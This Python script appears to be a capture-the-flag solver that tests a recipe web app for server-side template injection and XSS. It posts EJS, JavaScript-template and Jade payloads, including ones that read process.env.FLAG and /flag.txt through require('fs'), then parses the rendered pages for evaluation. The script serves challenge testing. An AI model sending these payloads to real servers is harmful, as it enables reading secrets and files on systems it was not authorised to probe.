#!/usr/bin/env python3
"""Re-derive the escaping claim from the rendered page, and test template injection.

The archive asserts "title HTML-escaped by EJS" without ever distinguishing *escaping*
from *double rendering*. If any path builds a string from the stored title and hands it to
`ejs.render` (or a template literal), then `<%= 7*7 %>` comes back as `49` and the challenge
is an SSTI, not a seal problem. Three cases separate cleanly on one response:

  raw      <h1><%= 7*7 %></h1>          -> the literal text, no escaping   (unescaped sink)
  escaped  <h1>&lt;%= 7*7 %&gt;</h1>    -> the literal text, escaped       (<%= %> sink)
  evaluated <h1>49</h1>                  -> template ran on our data        (SSTI)

Same three payloads go into an ingredient value, into the batch title, and into a
JSON-ish title, plus the JS-injection variant for the `window.__recipe` sink.
"""
import re
import sys
import time

from cc import new_baker

PAYLOADS = [
    ("ejs-print", "<%= 7*7 %>", "49"),
    ("ejs-raw", "<%- 7*7 %>", "49"),
    ("ejs-stmt", "<% var a=7 %><%= a %>", "7"),
    ("js-tmpl", "${7*7}", "49"),
    ("jade", "7*7".join(["#{", "}"]), "49"),
    ("require", "<%= process.env.FLAG %>", "sun{"),
    ("require2", "<%= require('fs').readFileSync('/flag.txt','utf8') %>", "sun{"),
    ("angle", "<b>bold</b>", "<b>"),
    ("script", "<script>alert(1)</script>", "<script>"),
]

TITLES = ["%s in title", "%s \u2028 in title"]


def log(*a):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), " ".join(str(x) for x in a))
    sys.stdout.buffer.write((line + "\n").encode("utf-8", "replace"))
    sys.stdout.flush()


u, c, _ = new_baker("ss")
log("user", u)
n = 0
for tag, payload, expect in PAYLOADS:
    if n >= 8:
        u, c, _ = new_baker("ss")
        n = 0
    body = {"title": payload + " | title",
            "ingredients": [{"name": "flour", "value": payload},
                            {"name": payload, "value": "1"}]}
    code, out, dt = c.post("/api/recipe", body)
    rid = out.get("id") if isinstance(out, dict) else None
    if not rid:
        log("  %-10s save -> %s %s" % (tag, code, str(out)[:80]))
        continue
    n += 1
    code, page, dt = c.get("/recipe/%s" % rid)
    page = str(page)
    h1 = re.search(r"<h1>(.*?)</h1>", page, re.S).group(1)
    cells = re.findall(r"<tr><td>\d+</td><td>(.*?)</td><td>(.*?)</td></tr>", page)
    review = str(c.get("/review/%s" % rid)[1])
    embedded = re.findall(r"window\.__recipe = (\{.*?\});", review, re.S)
    flags = []
    if expect != payload and expect in h1:
        flags.append("TITLE EVALUATED BY A TEMPLATE")
    if any(payload == a or payload == b for a, b in cells):
        flags.append("ING RENDERED RAW")
    if payload in h1:
        flags.append("title literal (escaped or raw, see repr)")
    log("  %-10s h1=%r" % (tag, h1[:60]))
    log("             cells=%s" % (str(cells)[:100],))
    log("             embedded=%s" % (str(embedded)[:100],))
    log("             -> %s" % (flags or "no evaluation"))
    if any("EVALUATED" in f or "RAW" in f for f in flags):
        open("../files/ssti_%s.html" % tag, "w", encoding="utf-8").write(page + "\n---\n" + review)
    c.post("/api/recipe/%s/submit" % rid, {})
    time.sleep(2)
log("done")
